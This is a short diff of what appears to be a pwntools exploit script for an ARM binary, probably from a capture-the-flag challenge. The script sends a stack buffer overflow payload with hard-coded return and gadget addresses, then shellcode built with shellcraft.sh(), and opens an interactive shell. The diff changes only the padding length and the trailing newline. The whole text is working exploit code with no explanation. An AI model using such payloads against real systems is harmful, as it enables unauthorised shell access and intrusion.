@@ -7,8 +7,8 @@ context.arch='arm'
 
 print(p.recv(1024))
 payload="a"*100+p32(0xf6ffe010)
-payload+=p32(0x10364)+p32(0xf6ffe010)+p32(0x10534)+"a"*3
-p.send(payload+"\n")
+payload+=p32(0x10364)+p32(0xf6ffe010)+p32(0x10534)+"a"*4
+p.send(payload)
 payload2=p32(0xf6ffe014)+asm(shellcraft.sh())
 p.send(payload2+"\n")
 p.interactive()
